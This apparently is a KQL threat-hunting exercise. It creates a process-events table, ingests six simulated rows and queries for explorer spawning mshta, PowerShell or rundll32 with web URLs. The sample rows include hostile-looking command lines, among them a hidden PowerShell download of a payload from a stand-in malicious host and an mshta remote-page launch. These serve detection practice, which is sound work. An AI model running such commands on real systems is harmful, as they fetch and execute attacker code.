
// 1) Create the DeviceProcessEvents table (skip if table already exists)
.create table DeviceProcessEvents (
    Timestamp: datetime,
    InitiatingProcessFileName: string,
    FileName: string,
    ProcessCommandLine: string
)

// 2) Inline ingest simulated rows (6 realistic examples)
.ingest inline into table DeviceProcessEvents <|
2025-11-03T10:00:00Z,explorer.exe,mshta.exe,"mshta http://malicioussite.com/fake.html"
2025-11-03T10:01:00Z,explorer.exe,powershell.exe,"powershell -nop -w hidden -Command (New-Object Net.WebClient).DownloadFile('http://malicioussite.com/payload.ps1','C:\\Temp\\payload.ps1')"
2025-11-03T10:02:00Z,explorer.exe,rundll32.exe,"rundll32 C:\\Temp\\mal.dll,EntryPoint"
2025-11-03T10:03:00Z,winword.exe,mshta.exe,"mshta https://onedrive.live.com/view.aspx?mal.html"
2025-11-03T10:04:00Z,explorer.exe,cmd.exe,"cmd /c calc.exe"
2025-11-03T10:05:00Z,explorer.exe,chrome.exe,"chrome.exe https://trusted.com"

// 3) Detection query: find Explorer/Office spawning risky loaders that reference external HTTP(S)
DeviceProcessEvents
| where InitiatingProcessFileName has "explorer"
| where FileName has_any ("mshta","powershell","rundll32")
| where ProcessCommandLine contains "http"
| project Timestamp, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by Timestamp desc